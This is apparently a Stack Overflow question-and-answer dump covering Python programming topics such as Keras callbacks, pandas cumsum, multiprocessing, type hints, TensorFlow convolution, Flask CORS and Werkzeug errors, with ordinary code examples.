<p>In addition, since the model is trained to optimize the loss, and that the training dataset should not be used to evaluate a model, I don't even understand why, by default, Tensorflow computes metrics during training.</p>
","71564427","<p>I think that the simplest solution to compute a metric only on the validation is using a custom callback.</p>
<p>here we define our dummy callback:</p>
<pre><code>class MyCustomMetricCallback(tf.keras.callbacks.Callback):

    def __init__(self, train=None, validation=None):
        super(MyCustomMetricCallback, self).__init__()
        self.train = train
        self.validation = validation

    def on_epoch_end(self, epoch, logs={}):

        mse = tf.keras.losses.mean_squared_error

        if self.train:
            logs['my_metric_train'] = float('inf')
            X_train, y_train = self.train[0], self.train[1]
            y_pred = self.model.predict(X_train)
            score = mse(y_train, y_pred)
            logs['my_metric_train'] = np.round(score, 5)

        if self.validation:
            logs['my_metric_val'] = float('inf')
            X_valid, y_valid = self.validation[0], self.validation[1]
            y_pred = self.model.predict(X_valid)
            val_score = mse(y_pred, y_valid)
            logs['my_metric_val'] = np.round(val_score, 5)
</code></pre>
<p>Given this dummy model:</p>
<pre><code>def build_model():

  inp1 = Input((5,))
  inp2 = Input((5,))
  out = Concatenate()([inp1, inp2])
  out = Dense(1)(out)

  model = Model([inp1, inp2], out)
  model.compile(loss='mse', optimizer='adam')

  return model
</code></pre>
<p>and this data:</p>
<pre><code>X_train1 = np.random.uniform(0,1, (100,5))
X_train2 = np.random.uniform(0,1, (100,5))
y_train = np.random.uniform(0,1, (100,1))

X_val1 = np.random.uniform(0,1, (100,5))
X_val2 = np.random.uniform(0,1, (100,5))
y_val = np.random.uniform(0,1, (100,1))
</code></pre>
<p>you can use the custom callback to compute the metric both on train and validation:</p>
<pre><code>model = build_model()

model.fit([X_train1, X_train2], y_train, epochs=10, 
          callbacks=[MyCustomMetricCallback(train=([X_train1, X_train2],y_train), validation=([X_val1, X_val2],y_val))])
</code></pre>
<p>only on validation:</p>
<pre><code>model = build_model()

model.fit([X_train1, X_train2], y_train, epochs=10, 
          callbacks=[MyCustomMetricCallback(validation=([X_val1, X_val2],y_val))])
</code></pre>
<p>only on train:</p>
<pre><code>model = build_model()

model.fit([X_train1, X_train2], y_train, epochs=10, 
          callbacks=[MyCustomMetricCallback(train=([X_train1, X_train2],y_train))])
</code></pre>
<p>remember only that <strong>the callback evaluates the metrics one-shot</strong> on the data, like any metric/loss computed by default by keras on the <code>validation_data</code>.</p>
<p><a href=""https://colab.research.google.com/drive/1ZT9jDHxTQLWzc8rMJ5dfgUT77Rr3j-GI?usp=sharing"" rel=""nofollow noreferrer"">here</a> is the running code.</p>
"
"71791008","1","np.cumsum(df['column']) treatment of nans","<p><code>np.cumsum([1, 2, 3, np.nan, 4, 5, 6])</code> will return <code>nan</code> for every value after the first <code>np.nan</code>. Moreover, it will do the same for any generator. However, <code>np.cumsum(df['column'])</code> will not. What does <code>np.cumsum(...)</code> do, such that dataframes are treated specially?</p>
<pre><code>In [2]: df = pd.DataFrame({'column': [1, 2, 3, np.nan, 4, 5, 6]})

In [3]: np.cumsum(df['column'])
Out[3]: 
0     1.0
1     3.0
2     6.0
3     NaN
4    10.0
5    15.0
6    21.0
Name: column, dtype: float64
</code></pre>
","71791193","<p>When you call <code>np.cumsum(object)</code> with an object that is not a numpy array, it will try calling <code>object.cumsum()</code> See <a href=""https://stackoverflow.com/questions/43865602/how-do-numpy-functions-operate-on-pandas-objects-internally"">this thread</a> for details
. You can also see it in the <a href=""https://github.com/numpy/numpy/blob/0d13f9f747887b290108a909dd92c3cb47239921/numpy/core/fromnumeric.py#L51"" rel=""nofollow noreferrer"">Numpy source</a>.</p>
<p>The <a href=""https://pandas.pydata.org/docs/reference/api/pandas.DataFrame.cumsum.html"" rel=""nofollow noreferrer"">pandas method</a> has a default of <code>skipna=True</code>. So <code>np.cumsum(df)</code> gets turned into the equivalent of <code>df.cumsum(axis=None, skipna=True, *args, **kwargs)</code>, which, of course skips the NaN values. The Numpy method does not have a <code>skipna</code> option.</p>
<p>You can also verify this yourself by overriding the pandas method with your own:</p>
<pre><code>class DF(pd.DataFrame):
    def cumsum(self, axis=None, skipna=True, *args, **kwargs):
        print('calling pandas cumsum')
        return super().cumsum(axis=None, skipna=True, *args, **kwargs)

df = DF({'column': [1, 2, 3, np.nan, 4, 5, 6]})

# does calling the numpy function call your pandas method?   
np.cumsum(df)
</code></pre>
<p>This will print</p>
<pre><code>calling pandas cumsum
</code></pre>
<p>and return the expected result:</p>
<pre><code>    column
0   1.0
1   3.0
2   6.0
3   NaN
4   10.0
5   15.0
6   21.0
</code></pre>
<p>You can then experiment with the result of changing <code>skipna=True</code>.</p>
"
"71580859","1","ImportError when importing psycopg2 on M1","<p>Has anyone gotten this error when importing <code>psycopg2</code> after successful installation?</p>
<pre><code>ImportError: dlopen(/Users/chrishicks/Desktop/test/venv/lib/python3.9/site-packages/psycopg2/_psycopg.cpython-39-darwin.so, 0x0002):
tried: '/Users/chrishicks/Desktop/test/venv/lib/python3.9/site-packages/psycopg2/_psycopg.cpython-39-darwin.so'
(mach-o file, but is an incompatible architecture
(have 'x86_64', need 'arm64e')),
'/usr/local/lib/_psycopg.cpython-39-darwin.so' (no such file),
'/usr/lib/_psycopg.cpython-39-darwin.so' (no such file)
</code></pre>
<p>I have tried installing <code>psycopg2</code> and <code>psycopg2-binary</code> and have tried both while running <code>iTerm</code> in Rosetta.</p>
","71581113","<p>Using this line should fix it:</p>
<pre><code>pip3.9 install psycopg2-binary --force-reinstall --no-cache-dir
</code></pre>
"
"71803409","1","VSCode: how to interrupt a running Python test?","<p>I'm using VSCode Test Explorer to run my Python unit tests. There was a bug in my code and my tested method never finishes.</p>
<p>How do I interrupt my test? I can't find how to do it using the GUI. I had to close VSCode to interrupt it.</p>
<p>I'm using pytest framework.</p>
","71803605","<p>Silly me, here is the <em>Stop button</em> at the top right of the the Testing tab:</p>
<p><a href=""https://i.stack.imgur.com/a71uQ.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/a71uQ.png"" alt=""Test stop button"" /></a></p>
"
"71630563","1","Syntax for making objects callable in python","<p>I understand that in python user-defined objects can be made callable by defining a <code>__call__()</code> method in the class definition. For example,</p>
<pre><code>class MyClass:
  def __init__(self):
    pass

  def __call__(self, input1):
    self.my_function(input1)

  def my_function(self, input1):
    print(f&quot;MyClass - print {input1}&quot;)

my_obj = MyClass()
# same as calling my_obj.my_function(&quot;haha&quot;)
my_obj(&quot;haha&quot;) # prints &quot;MyClass - print haha&quot;
</code></pre>
<p>I was looking at how <code>pytorch</code> makes the <code>forward()</code> method of a <code>nn.Module</code> object be called implicitly when the object is called and saw some syntax I didn't understand.</p>
<p>In <a href=""https://github.com/pytorch/pytorch/blob/1c5a8125798392f8d7c57e88735f43a14ae0beca/torch/nn/modules/module.py#L1156"" rel=""noreferrer"">the line</a> that supposedly defines the <code>__call__</code> method the syntax used is,</p>
<pre><code>__call__ : Callable[..., Any] = _call_impl
</code></pre>
<p>This seemed like a combination of an annotation (keyword <code>Callable[</code> following <code>:</code> ignored by python) and a value of <code>_call_impl</code> which we want to be called when <code>__call__</code> is invoked, and my guess is that this is a shorthand for,</p>
<pre><code>def __call__(self, *args, **kwargs):
    return self._call_impl(*args, **kwargs)
</code></pre>
<p>but wanted to understand clearly how this method of defining functions worked.</p>
<p>My question is: When would we want to use such a definition of callable attributes of a class instead of the usual <code>def myfunc(self, *args, **kwargs)</code></p>
","71630606","<p>Functions are normal first-class objects in python. The name to with which you define a function object, e.g. with a <code>def</code> statement, is not set in stone, any more than it would be for an <code>int</code> or <code>list</code>. Just as you can do</p>
<pre><code>a = [1, 2, 3]
b = a
</code></pre>
<p>to access the elements of <code>a</code> through the name <code>b</code>, you can do the same with functions. In your first example, you could replace</p>
<pre><code>def __call__(self, input1):
    self.my_function(input1)
</code></pre>
<p>with the much simpler</p>
<pre><code>__call__ = my_function
</code></pre>
<p>You would need to put this line after the definition of <code>my_function</code>.</p>
<p>The key differences between the two implementations is that <code>def __call__(...</code> creates a new function. <code>__call__ = ...</code> simply binds the name <code>__call__</code> to the same object as <code>my_function</code>. The noticeable difference is that if you do <code>__call__.__name__</code>, the first version will show <code>__call__</code>, while the second will show <code>my_function</code>, since that's what gets assigned by a <code>def</code> statement.</p>
"
"71823279","1","Python Read huge file line per line and send it to multiprocessing or thread","<p>I have been trying to get my code to work for many days,
I am desperate.
I've scoured the internet, but I still can't find it.</p>
<p>I have a text file encoded in &quot;latin-1&quot; of 9GB -&gt; 737 022 387 lines, each line contains a string.</p>
<p>I would like to read each line and send them in an http PUT request that waits for a response, and returns TRUE or FALSE if the response is 200 or 400
The PUT request takes about 1 to 3 seconds, so to speed up the processing time I would like to use either a Thread or a multiprocessing.</p>
<p>To start, I simulate my PUT request with a sleep of 3 seconds.
and even that I can't get it to work</p>
<p>This code split my string into char, i don't know why...</p>
<pre><code>from multiprocessing import Pool
from time import sleep


def process_line(line):
   sleep(3)
   print(line)
   return True

if __name__ == &quot;__main__&quot;:
    pool = Pool(2)
    peon =  open(r'D:\txtFile',encoding=&quot;latin-1&quot;)
    for line in peon:
        res = pool.map(process_line,line )
        print(res)
</code></pre>
<p>This give error : TypeError: process_line() takes 1 positional argument but 17 were given</p>
<pre><code>import multiprocessing
from multiprocessing import Pool
from time import sleep


def process_line(line):
   sleep(3)
   print(line)
   return True

if __name__ == &quot;__main__&quot;:
    pool = Pool(2)
    with open(r&quot;d:\txtFile&quot;,encoding=&quot;latin-1&quot;) as file:
        res = pool.apply(process_line,file.readline() )
        print(res)
</code></pre>
<p>that : Crash the computer</p>
<pre><code>from multiprocessing import Pool
from time import sleep


def process_line(line):
   sleep(3)
   print(line)
   return True

if __name__ == &quot;__main__&quot;:
    pool = Pool(2)
    peon =  open(r'D:\txtFile',encoding=&quot;latin-1&quot;)
    for line in peon:
        res = pool.map(process_line,peon )
        print(res)
</code></pre>
","71824107","<p>Although the problem seems unrealistic though. shooting 737,022,387 requests! calculate how many months it'll take from single computer!!</p>
<p>Still, Better way to do this task is to read line by line from file in a separate thread and insert into a queue. And then multi-process the queue.</p>
<p><strong>Solution 1:</strong></p>
<pre class=""lang-py prettyprint-override""><code>from multiprocessing import Queue, Process
from threading import Thread
from time import sleep

urls_queue = Queue()
max_process = 4

def read_urls():
    with open('urls_file.txt', 'r') as f:
        for url in f:
            urls_queue.put(url.strip())
            print('put url: {}'.format(url.strip()))

    # put DONE to tell send_request_processor to exit
    for i in range(max_process):
        urls_queue.put(&quot;DONE&quot;)


def send_request(url):
    print('send request: {}'.format(url))
    sleep(1)
    print('recv response: {}'.format(url))


def send_request_processor():
    print('start send request processor')
    while True:
        url = urls_queue.get()
        if url == &quot;DONE&quot;:
            break
        else:
            send_request(url)


def main():
    file_reader_thread = Thread(target=read_urls)
    file_reader_thread.start()

    procs = []
    for i in range(max_process):
        p = Process(target=send_request_processor)
        procs.append(p)
        p.start()

    for p in procs:
        p.join()

    print('all done')
    # wait for all tasks in the queue
    file_reader_thread.join()


if __name__ == '__main__':
    main()
</code></pre>
<p>Demo: <a href=""https://onlinegdb.com/Elfo5bGFz"" rel=""nofollow noreferrer"">https://onlinegdb.com/Elfo5bGFz</a></p>
<p><strong>Solution 2:</strong></p>
<p>You can use <a href=""https://www.tornadoweb.org/en/stable/queues.html"" rel=""nofollow noreferrer"">tornado</a> asynchronous networking library</p>
<pre class=""lang-py prettyprint-override""><code>from tornado import gen
from tornado.ioloop import IOLoop
from tornado.queues import Queue

q = Queue(maxsize=2)

async def consumer():
    async for item in q:
        try:
            print('Doing work on %s' % item)
            await gen.sleep(0.01)
        finally:
            q.task_done()

async def producer():
    with open('urls_file.txt', 'r') as f:
        for url in f:
            await q.put(url)
            print('Put %s' % item)

async def main():
    # Start consumer without waiting (since it never finishes).
    IOLoop.current().spawn_callback(consumer)
    await producer()     # Wait for producer to put all tasks.
    await q.join()       # Wait for consumer to finish all tasks.
    print('Done')
    # producer and consumer can run in parallel

IOLoop.current().run_sync(main)
</code></pre>
"
"71655179","1","How can I make an object with an interface like a random number generator, but that actually generates a specified sequence?","<p>I'd like to construct an object that works like a random number generator, but generates numbers in a specified sequence.</p>
<pre><code># a random number generator
rng = lambda : np.random.randint(2,20)//2

# a non-random number generator
def nrng():
    numbers = np.arange(1,10.5,0.5)
    for i in range(len(numbers)):
        yield numbers[i]

for j in range(10):
    print('random number', rng())
    print('non-random number', nrng())
</code></pre>
<p>The issue with the code above that I cannot call <code>nrng</code> in the last line because it is a generator. I know that the most straightforward way to rewrite the code above is to simply loop over the non-random numbers instead of defining the generator. I would prefer getting the example above to work because I am working with a large chunk of code that include a function that accepts a random number generator as an argument, and I would like to add the functionality to pass non-random number sequences without rewriting the entire code.</p>
<p>EDIT: I see some confusion in the comments. I am aware that python's random number generators generate pseudo-random numbers. This post is about replacing a pseudo-random-number generator by a number generator that generates numbers from a <strong>non-random, user-specified</strong> sequence (e.g., a generator that generates the number sequence <code>1,1,2,2,1,0,1</code> if I want it to).</p>
","71655539","<p>Edit:</p>
<p>The cleanest way to do this would be to use a lambda to wrap your call to <code>next(nrng)</code> as per great comment from @GACy20:</p>
<pre><code>def nrng_gen():
    yield from range(10)

nrng = nrng_gen()

nrng_func = lambda: next(nrng)

for i in range(10):
    print(nrng_func())
</code></pre>
<p>Original answer:</p>
<p>If you want your object to keep state and look like a function, create a custom class with <code>__call__</code> method.</p>
<p>eg.</p>
<pre><code>class NRNG:
    def __init__(self):
        self.numbers = range(10)
        self.state = -1
    def __call__(self):
        self.state += 1
        return self.numbers[self.state]
        
nrng = NRNG()


for i in range(10):
    print(nrng())
</code></pre>
<p>However, I wouldn't recommend this unless absolutely necessary, as it obscures the fact that your nrng keeps a state (although technically, most rngs keep their state internally).</p>
<p>It's best to just use a regular generator with <code>yield</code> by calling next on it or to write a custom iterator (also class-based). Those will work with things like for loops and other python tools for iteration (like the excellent itertools package).</p>
"
"71656644","1","Python type hint for Iterable[str] that isn't str","<p>In Python, is there a way to distinguish between strings and other iterables of strings?</p>
<p>A <code>str</code> is valid as an <code>Iterable[str]</code> type, but that may not be the correct input for a function. For example, in this trivial example that is intended to operate on sequences of filenames:</p>
<pre><code>from typing import Iterable

def operate_on_files(file_paths: Iterable[str]) -&gt; None:
    for path in file_paths:
        ...
</code></pre>
<p>Passing in a single filename would produce the wrong result but would not be caught by type checking. I know that I can check for string or byte types at runtime, but I want to know if it's possible to catch silly mistakes like that with a type-checking tool.</p>
<p>I've looked over the <code>collections.abc</code> module and there doesn't seem to be any abc that would include typical iterables (e.g. lists, tuples) but exclude strings. Similarly, for the <code>typing</code> module, there doesn't seem to be a type for iterables that don't include strings.</p>
","71657094","<h2>As of March 2022, the answer is <strong>no</strong>.</h2>
<p>This issue has been discussed since at least July 2016. On a proposal to distinguish between <code>str</code> and <code>Iterable[str]</code>, <a href=""https://github.com/python/typing/issues/256"" rel=""nofollow noreferrer"">Guido van Rossum</a> writes:</p>
<blockquote>
<p>Since <code>str</code> <em>is</em> a valid iterable of <code>str</code> this is tricky. Various proposals have been made but they don't fit easily in the type system.</p>
</blockquote>
<p><strong>You'll need to list out all of the types that you want your functions to accept explicitly</strong>, using <code>Union</code> (pre-3.10) or <code>|</code> (3.10 and higher).</p>
<p>e.g. For pre-3.10, use:</p>
<pre class=""lang-py prettyprint-override""><code>from typing import Union
## Heading ##
def operate_on_files(file_paths: Union[TypeOneName, TypeTwoName, etc.]) -&gt; None:
    for path in file_paths:
        ...
</code></pre>
<p>For 3.10 and higher, use:</p>
<pre class=""lang-py prettyprint-override""><code>## Heading ##
def operate_on_files(file_paths: TypeOneName | TypeTwoName | etc.) -&gt; None:
    for path in file_paths:
        ...
</code></pre>
<p>If you happen to be using Pytype, <a href=""https://github.com/google/pytype/blob/main/docs/faq.md#why-doesnt-str-match-against-string-iterables"" rel=""nofollow noreferrer"">it will not treat <code>str</code> as an <code>Iterable[str]</code></a> (as pointed out by <a href=""https://stackoverflow.com/users/12671057/kelly-bundy"">Kelly Bundy</a>). But, this behavior is typechecker-specific, and isn't widely supported in other typecheckers.</p>
"
"71828861","1","Filtering audio signal in TensorFlow","<p>I am building an audio-based deep learning model. As part of the preporcessing I want to augment the audio in my datasets. One augmentation that I want to do is to apply RIR (room impulse response) function. I am working with <code>Python 3.9.5</code> and <code>TensorFlow 2.8</code>.</p>
<p>In Python the standard way to do it is, if the RIR is given as a finite impulse response (FIR) of <em>n</em> taps, is using <a href=""https://docs.scipy.org/doc/scipy/reference/generated/scipy.signal.lfilter.html"" rel=""nofollow noreferrer"">SciPy lfilter</a></p>
<pre><code>import numpy as np
from scipy import signal
import soundfile as sf

h = np.load(&quot;rir.npy&quot;)
x, fs = sf.read(&quot;audio.wav&quot;)

y = signal.lfilter(h, 1, x)
</code></pre>
<p>Running in loop on all the files may take a long time. Doing it with TensorFlow <code>map</code> utility on TensorFlow datasets:</p>
<pre><code># define filter function
def h_filt(audio, label):
    h = np.load(&quot;rir.npy&quot;)
    x = audio.numpy()
    y = signal.lfilter(h, 1, x)
    return tf.convert_to_tensor(y, dtype=tf.float32), label

# apply it via TF map on dataset
aug_ds = ds.map(h_filt)
</code></pre>
<p>Using <code>tf.numpy_function</code>:</p>
<pre><code>tf_h_filt = tf.numpy_function(h_filt, [audio, label], [tf.float32, tf.string])

# apply it via TF map on dataset
aug_ds = ds.map(tf_h_filt)
</code></pre>
<p>I have two questions:</p>
<ol>
<li>Is this way correct and fast enough (less than a minute for 50,000 files)?</li>
<li>Is there a faster way to do it? E.g. replace the SciPy function with a built-in TensforFlow function. I didn't find the equivalent of <code>lfilter</code> or <a href=""https://docs.scipy.org/doc/scipy/reference/generated/scipy.signal.convolve.html"" rel=""nofollow noreferrer"">SciPy's convolve</a>.</li>
</ol>
","71838022","<p>Here is one way you could do</p>
<p>Notice that tensor flow function is designed to receive batches of inputs with multiple channels, and the filter can have multiple input channels and multiple output channels. Let <code>N</code> be the size of the batch <code>I</code>, the number of input channels, <code>F</code> the filter width, <code>L</code> the input width and <code>O </code> the number of output channels. Using <code>padding='SAME'</code> it maps an input of shape <code>(N, L, I)</code> and a filter of shape <code>(F, I, O)</code> to an output of shape <code>(N, L, O)</code>.</p>
<pre class=""lang-py prettyprint-override""><code>import numpy as np
from scipy import signal
import tensorflow as tf

# data to compare the two approaches
x = np.random.randn(100)
h = np.random.randn(11)

# h
y_lfilt = signal.lfilter(h, 1, x)

# Since the denominator of your filter transfer function is 1
# the output of lfiler matches the convolution
y_np = np.convolve(h, x)
assert np.allclose(y_lfilt, y_np[:len(y_lfilt)])

# now let's do the convolution using tensorflow
y_tf = tf.nn.conv1d(
    # x must be padded with half of the size of h
    # to use padding 'SAME'
    np.pad(x, len(h) // 2).reshape(1, -1, 1), 
    # the time axis of h must be flipped
    h[::-1].reshape(-1, 1, 1), # a 1x1 matrix of filters
    stride=1, 
    padding='SAME', 
    data_format='NWC')

assert np.allclose(y_lfilt, np.squeeze(y_tf)[:len(y_lfilt)])
</code></pre>
"
"71818149","1","POST request gets blocked on Python backend. GET request works fine","<p>I am building a web app where the front-end is done with Flutter while the back-end is with Python.
GET requests work fine while POST requests get blocked because of CORS, I get this error message:</p>
<pre><code>Access to XMLHttpRequest at 'http://127.0.0.1:8080/signal' from origin 'http://localhost:57765' has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present on the requested resource.
</code></pre>
<p>Below is my flutter function I used to send GET and POST requests:</p>
<pre><code>  Future&lt;dynamic&gt; sendResponse() async {
    final url = 'http://127.0.0.1:8080/signal';
    var data = {
      &quot;signal&quot;: '8',
    };
    var header = {
      'Access-Control-Allow-Origin': '*',
      &quot;Accept&quot;: &quot;application/x-www-form-urlencoded, '*'&quot;
    };


    http.Response response = await http.post(Uri.parse(url), body: data, headers: header);//http.post(Uri.parse(url), body: data, headers: header);//http.get(Uri.parse(url));
    if (response.statusCode == 200) {
      print(json.decode(response.body));
      return jsonDecode(response.body);
      //print(json.decode(credentials.body));
    } else {
      print(response.statusCode);
      throw Exception('Failed to load Entry');
    }

   // var ResponseFromPython = await response.body;//jsonDecode(credentials.body);

   // return ResponseFromPython;
  }
</code></pre>
<p>Below is my Python backend code using Flask:</p>
<pre><code>   from flask import Flask,jsonify, request, make_response
   import json


   from flask_cors import CORS, cross_origin


   #declared an empty variable for reassignment
   response = ''

   app = Flask(__name__)

   #CORS(app, resources={r&quot;/signal&quot;: {&quot;origins&quot;: &quot;*, http://localhost:59001&quot;}}) 
   #http://localhost:52857
   #CORS(app, origins=['*'])
   app.config['CORS_HEADERS'] = ['Content-Type','Authorization']



   @app.route(&quot;/&quot;)
   def index():
    
    return &quot;Congratulations, it worked&quot;

   @app.route(&quot;/signal&quot;, methods = ['POST', 'GET']) #,
   @cross_origin(origins='http://localhost:57765',headers=['Content-Type','Authorization', 
   'application/x-www-form-urlencoded','*'], upports_credentials=True)# allow all origins all 
   methods.
   def multbytwo():
       &quot;&quot;&quot;multiple signal by 2 just to test.&quot;&quot;&quot;
       global response
       if (request.method=='POST'):
       # request.headers.add(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;)
           request_data = request.data #getting the response data
           request_data = json.loads(request_data.decode('utf-8')) #converting it from json to key 
   value pair
           comingSignal = request_data['signal']
           response = make_response(comingSignal, 201)#jsonify(comingSignal*2)
           response.headers.add('Access-Control-Allow-Origin', '*')
           response.headers.add('Access-Control-Allow-Methods&quot;, &quot;DELETE, POST, GET, OPTIONS')
           response.headers.add('Access-Control-Allow-Headers&quot;, &quot;Content-Type, Authorization, X- 
  Requested-With')
           return response
       else:
           try:
        #scaler = request.args.get(&quot;signal&quot;)
               out = 9 * 2 
         
               response = jsonify(out)
               response.headers.add(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;) 
               return response #sending data back to your frontend app

           except ValueError:
               return &quot;invalid input xyz&quot;

   if __name__ == &quot;__main__&quot;:
       app.run(host=&quot;127.0.0.1&quot;, port=8080, debug=True)
</code></pre>
<p>Below are the troubleshooting steps I made:
<strong>-Added the flask_CORS package in python</strong>
I tried here different combination from using general parameters like <code>CORS(app, resources={r&quot;/signal&quot;: {&quot;origins&quot;: &quot;*&quot;}}) </code> did not help. Also tried the decorator <code>@cross-origin</code> and did not help</p>
<p><strong>-Added some headers to the response itself to indicate that it accepts cross-origin</strong>
You see in my python code I tried adding a lot of headers to the response, nothing seem to respond.</p>
<p><strong>-Tried installing an extension in Chrome that by-passes the CORS check</strong>
I tried the <code>allow CORS</code> and <code>CORS unblock</code> extensions and I used the steps described in this answer: <a href=""https://stackoverflow.com/questions/67958169/how-chrome-extensions-be-enabled-when-flutter-web-debugging"">How chrome extensions be enabled when flutter web debugging?</a>. Although these extensions are supposed to add the CORS allow header to the response, I still got the same error.</p>
<p>I still do not fully understand the CORS concept but I tried a lot of work-arounds and nothing works! please help.</p>
","71882248","<p>I finally figured out what was going on.
<strong>First I disabled the same origin policy in chrome using this command:</strong> this is run clicking the start button in windows and typing this command directly..</p>
<pre><code>chrome.exe  --disable-site-isolation-trials --disable-web-security --user-data-dir=&quot;D:\anything&quot;
</code></pre>
<p>This fired a separate chrome window that does not block cross-origin, we will call this the CORS free window. This allowed me to finally communicate with my python code and understand what is going on.
<a href=""https://i.stack.imgur.com/lfi1i.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/lfi1i.png"" alt=""You can see the "" /></a></p>
<p>You can see that the chrome default setting were not even showing me anything related to the response, just showing a 500 code error.</p>
<p><strong>I copied the localhost link and port and pasted them in my other CORS free chrome window</strong>
The other CORS free chrome window showed helpful information:
<a href=""https://i.stack.imgur.com/z2JI3.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/z2JI3.png"" alt=""enter image description here"" /></a></p>
<p><strong>It was a simple JSON decoding error!</strong> I went back to my flutter code and I changed the http post request, adding a <code>jsonEncode</code> function on the post body:</p>
<pre><code>http.Response response = await http.post(Uri.parse(url), body:jsonEncode(data), headers: header);
</code></pre>
<p>Now the post request returns a correct response on the default chrome settings.
<a href=""https://i.stack.imgur.com/1PvlY.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/1PvlY.png"" alt=""enter image description here"" /></a>
It was just this CORS blocking the response completely that made me handi-capped.</p>
"
"72166259","1","Werkzeug server is shutting down in Django application","<p>after updating the Werkzeug version from 2.0.3 to 2.1.0, I keep getting errors every time I run the server, and here is the error log:</p>
<pre><code>Exception happened during processing of request from ('127.0.0.1', 44612)                                                                                                                                  
Traceback (most recent call last):                                                                                                                                                                         
  File &quot;/usr/lib/python3.8/socketserver.py&quot;, line 683, in process_request_thread                                                                                                                           
    self.finish_request(request, client_address)                                                                                                                                                           
  File &quot;/usr/lib/python3.8/socketserver.py&quot;, line 360, in finish_request                                                                                                                                   
    self.RequestHandlerClass(request, client_address, self)                                                                                                                                                
  File &quot;/usr/lib/python3.8/socketserver.py&quot;, line 747, in __init__                                                                                                                                         
    self.handle()                                                                                                                                                                                          
  File &quot;/home/oladhari/.virtualenvs/reachat/lib/python3.8/site-packages/werkzeug/serving.py&quot;, line 363, in handle                                                                                          
    super().handle()                                                                                                                                                                                       
  File &quot;/usr/lib/python3.8/http/server.py&quot;, line 427, in handle                                                                                                                                            
    self.handle_one_request()                                                                                                                                                                              
  File &quot;/usr/lib/python3.8/http/server.py&quot;, line 415, in handle_one_request                                                                                                                                
    method()                                                                                                                                                                                               
  File &quot;/home/oladhari/.virtualenvs/reachat/lib/python3.8/site-packages/werkzeug/serving.py&quot;, line 243, in run_wsgi                                                                                        
    self.environ = environ = self.make_environ()                                                                                                                                                           
  File &quot;/home/oladhari/.virtualenvs/reachat/lib/python3.8/site-packages/django_extensions/management/commands/runserver_plus.py&quot;, line 326, in make_environ                                                
    del environ['werkzeug.server.shutdown']                                                                                                                                                                
KeyError: 'werkzeug.server.shutdown'  
</code></pre>
<p>this exception keep appearing while incrementing by 2 ( ('127.0.0.1', 44612) -&gt;  ('127.0.0.1', 44628)  and the server crash</p>
<p>checking the changes log, I have found this detail:</p>
<pre><code>Remove previously deprecated code. #2276

Remove the non-standard shutdown function from the WSGI environ when running the development server. See the docs for alternatives.
</code></pre>
<p>here is the link to the <a href=""https://werkzeug.palletsprojects.com/en/2.1.x/changes/#version-2-1-0"" rel=""noreferrer"">changes log</a></p>
<p>it asks to check the <a href=""https://werkzeug.palletsprojects.com/en/2.1.x/"" rel=""noreferrer"">documentation</a> for alternatives but can not find any</p>
<p>please let me know how I would resolve this error, thank you
NB: my python version is 3.8</p>
","72206748","<p>Literally just ran into this today. According to their (<a href=""https://github.com/django-extensions/django-extensions/issues/1715"" rel=""noreferrer"">git repo issue 1715</a>) and assuming you are running <code>runserver_plus</code>, there are three options that worked for some users. The first worked for me:</p>
<ol>
<li>Not altering your files and adding the option <code>--keep-meta-shutdown</code>. My full command looks like <code>python manage.py runserver_plus --cert-file /path/to/cert.pem --key-file /path/to/key.pem --keep-meta-shutdown localhost:9000</code></li>
<li>Comment out open lines 325 and 326 under your runserver_plus.py</li>
<li>Upgrading python to 3.10</li>
</ol>
<p>Hope this helps!</p>
"
"72782100","1","For loop in c# vs For loop in python","<p>I was writing a method that would calculate the value of e^x. The way I implemented this in python was as follows.</p>
<pre><code>import math

def exp(x):
    return sum([
        x**n/math.factorial(n)
        for n in range(0, 100)
    ])
</code></pre>
<p>This would return the value of e^x very well. But when I tried to implement the same method in c#, it didn't output the same value as it did in python. The following was the implementation in c#.</p>
<pre><code>static double exp(int x)
{
    double FinalAnswer = 0;
    for (int j = 0; j &lt;= 100; j++)
    {
        FinalAnswer += (Math.Pow(x, j))/Factorial(j);
    }
    return FinalAnswer;
}
</code></pre>
<p>The output for this code was an infinity symbol at first. To resolve this I just reduced the number of times the loop ran. The output of the code in c# where the loop only ran 10 times was pretty close to the output in python where the loop ran 100 times. My question is that what is going on between the two loops in different programming languages. At first I thought that the expression that I was using in my method to calculate e^x was converging quickly. But how does a loop that runs 10 times produce an output that matches the output of a loop that runs 100 times.</p>
<p>Also, When I increased the for loop in c# to 20 and 30, the values of e^x for x &gt; 3 were way off. Could someone explain what is going on here?</p>
","72782395","<p>What you're likely running into here is <strong>integer overflow</strong> with the C# version of the Factorial function (at least your implementation of it, or wherever its coming from).</p>
<p>In C#, an <code>int</code> is a numerical type stored in 32 bits of memory, which means it's bounded by <code>-2^31 &lt;= n &lt;= 2^31 - 1</code> which is around +/- 2.1 billion. You could try using a <code>long</code> type, which is a 64 bit numerical type, however for even larger upper bounds in your for loop, like getting close to 100, you're going to overflow <code>long</code> as well.</p>
<p>When you run the Factorial function in C#, it starts off normally for the first little while, however if you keep going, you'll see that it all of a sudden jumps into negative numbers, and if you keep going even further than that, it'll get to 0 and stop changing. You're seeing the output of infinity due to division by 0, and C# has a way of handling that with doubles; that being to just return <code>double.PositiveInfinity</code>.</p>
<p>The reason why this doesn't happen in python is that it uses a variable number of bits to store its numerical values.</p>
<p><strong>Added note:</strong> What you might also want to try is using a Factorial function that works with the <code>double</code> type instead of <code>int</code> or <code>long</code>, however by doing this, you'll lose precision on what the exact value is, but you get more range as the magnitude of the number you can store is larger</p>
<p><strong>Further Note:</strong> As mentioned in the comments, C# has a type called <code>BigInteger</code> which is designed to handle huge numbers like the values you would expect from large inputs to a Factorial function. You can find a reference to the BigInteger docs <a href=""https://learn.microsoft.com/en-us/dotnet/api/system.numerics.biginteger?view=net-6.0"" rel=""nofollow noreferrer"">here</a></p>
<hr />
<p>What you can do is calculate each component of the factorial function separately with the power you're using. Here's what I mean:</p>
<pre><code>public decimal Exp(decimal power, int accuracy = 100)
{
    decimal runningTotal = 1;
    decimal finalValue = 1;
    for (int i = 1; i &lt;= accuracy; i++)
    {
        runningTotal *= power/i;
        finalValue += runningTotal;
    }
    return finalValue;
}
</code></pre>
"
